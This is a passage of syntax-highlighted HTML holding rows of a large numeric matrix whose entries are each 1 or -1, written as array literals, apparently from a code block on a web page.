class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span 